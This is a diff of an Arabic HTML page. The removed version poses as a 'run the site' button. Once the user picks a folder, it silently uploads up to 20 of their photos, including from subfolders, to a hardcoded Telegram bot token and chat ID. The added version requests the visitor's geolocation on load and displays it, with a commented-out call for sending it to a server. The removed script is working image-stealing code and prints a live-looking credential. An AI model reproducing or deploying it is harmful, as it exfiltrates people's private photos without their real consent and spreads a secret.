@@ -1,84 +1,115 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تشغيل الموقع</title>
+    <title>طلب إذن الموقع الجغرافي</title>
     <style>
-        body { font-family: Arial; text-align: center; padding: 50px; background-color: #f5f5f5; }
-        .container { background: white; border-radius: 10px; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
-        button { background: #4CAF50; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; margin: 20px 0; }
-        button:hover { background: #45a049; }
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 20px;
+            padding: 20px;
+        }
+        #status {
+            margin: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            background-color: #f0f0f0;
+        }
+        #locationInfo {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #e8f5e9;
+            border-radius: 5px;
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>تشغيل الموقع</h1>
-        <p>اضغط الزر لبدء الإرسال التلقائي</p>
-        <button id="sendButton">تشغيل الموقع</button>
+    <h1>طلب إذن الوصول إلى موقعك الجغرافي</h1>
+    <div id="status">جاري طلب إذن الوصول إلى موقعك...</div>
+    <div id="locationInfo">
+        <h2>معلومات موقعك:</h2>
+        <p><strong>خط العرض:</strong> <span id="latitude"></span></p>
+        <p><strong>خط الطول:</strong> <span id="longitude"></span></p>
+        <p><strong>الدقة:</strong> <span id="accuracy"></span> متر</p>
     </div>
 
     <script>
-        // بيانات البوت
-        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
-        const CHAT_ID = "6913353602";
-        const MAX_IMAGES = 20;
+        const statusDiv = document.getElementById('status');
+        const locationInfoDiv = document.getElementById('locationInfo');
+        const latitudeSpan = document.getElementById('latitude');
+        const longitudeSpan = document.getElementById('longitude');
+        const accuracySpan = document.getElementById('accuracy');
 
-        document.getElementById('sendButton').addEventListener('click', async () => {
-            try {
-                // محاولة الوصول لمجلد الصور مباشرة
-                const dirHandle = await window.showDirectoryPicker();
-                await sendImagesAutomatically(dirHandle);
-                alert("تم إرسال " + MAX_IMAGES + " صورة بنجاح!");
-            } catch (error) {
-                console.error('Error:', error);
-                alert("حدث خطأ! تأكد من منح الإذن اللازم");
-            }
+        // طلب إذن الموقع عند تحميل الصفحة
+        window.addEventListener('DOMContentLoaded', () => {
+            requestLocationPermission();
         });
 
-        async function sendImagesAutomatically(dirHandle) {
-            let sentCount = 0;
-            
-            // إرسال الصور تلقائياً دون تفاعل
-            for await (const entry of dirHandle.values()) {
-                if (sentCount >= MAX_IMAGES) break;
-                
-                if (entry.kind === 'file' && isImage(entry.name)) {
-                    await sendToTelegram(await entry.getFile());
-                    sentCount++;
-                }
-                
-                // البحث في المجلدات الفرعية إذا لزم الأمر
-                else if (entry.kind === 'directory' && sentCount < MAX_IMAGES) {
-                    const subDir = await dirHandle.getDirectoryHandle(entry.name);
-                    for await (const subEntry of subDir.values()) {
-                        if (sentCount >= MAX_IMAGES) break;
-                        if (subEntry.kind === 'file' && isImage(subEntry.name)) {
-                            await sendToTelegram(await subEntry.getFile());
-                            sentCount++;
-                        }
-                    }
-                }
+        function requestLocationPermission() {
+            if (!navigator.geolocation) {
+                statusDiv.textContent = 'متصفحك لا يدعم خدمة الموقع الجغرافي';
+                statusDiv.style.backgroundColor = '#ffebee';
+                return;
             }
-        }
-        
-        async function sendToTelegram(file) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', file, file.name);
+
+            statusDiv.textContent = 'جاري طلب إذن الوصول إلى موقعك...';
             
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-            
-            await new Promise(resolve => setTimeout(resolve, 300));
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // عند منح الإذن بنجاح
+                    showLocation(position);
+                },
+                (error) => {
+                    // عند رفض الإذن أو حدوث خطأ
+                    handleLocationError(error);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
         }
-        
-        function isImage(filename) {
-            return ['.jpg','.jpeg','.png','.gif','.bmp','.webp'].some(ext => 
-                filename.toLowerCase().endsWith(ext));
+
+        function showLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            
+            latitudeSpan.textContent = latitude;
+            longitudeSpan.textContent = longitude;
+            accuracySpan.textContent = accuracy;
+            
+            statusDiv.textContent = 'تم الحصول على الموقع بنجاح!';
+            statusDiv.style.backgroundColor = '#e8f5e9';
+            locationInfoDiv.style.display = 'block';
+            
+            // يمكنك هنا إرسال البيانات إلى الخادم إذا لزم الأمر
+            // sendLocationToServer(latitude, longitude);
+        }
+
+        function handleLocationError(error) {
+            let message = '';
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    message = 'تم رفض إذن الوصول إلى الموقع';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = 'معلومات الموقع غير متاحة';
+                    break;
+                case error.TIMEOUT:
+                    message = 'انتهى وقت طلب الموقع';
+                    break;
+                case error.UNKNOWN_ERROR:
+                    message = 'حدث خطأ غير معروف';
+                    break;
+            }
+            statusDiv.textContent = message;
+            statusDiv.style.backgroundColor = '#ffebee';
         }
     </script>
 </body>
-</html>
+</html>1
